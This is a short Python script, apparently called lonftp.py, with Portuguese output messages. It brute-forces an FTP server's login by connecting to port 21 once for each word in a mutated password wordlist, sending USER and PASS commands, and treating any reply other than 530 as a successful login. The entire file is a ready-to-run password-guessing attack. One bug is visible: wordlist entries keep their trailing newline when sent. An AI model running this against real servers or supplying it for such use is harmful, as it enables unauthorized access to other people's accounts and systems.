#!/usr/bin/python
import socket,sys,re

if len(sys.argv) != 3:
    print("Modo de uso: python lonftp.py 127.0.0.1 usuario")
    sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open('mutacao-wordlist-kaua.txt')
for palavras in f.readlines():
    print(f"Tentativa de login no FTP\n{usuario}:{palavras}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,21))
    s.recv(1024)
    s.send(f"USER {usuario}\r\n".encode())
    s.recv(1024)
    s.send(f"PASS {palavras}\r\n".encode())
    result = s.recv(1024).decode()
    s.send("QUIT\r\n".encode())
    
    if re.search("530", result):
        print("Login incorreto")
    else:
        print("Login sucesso")
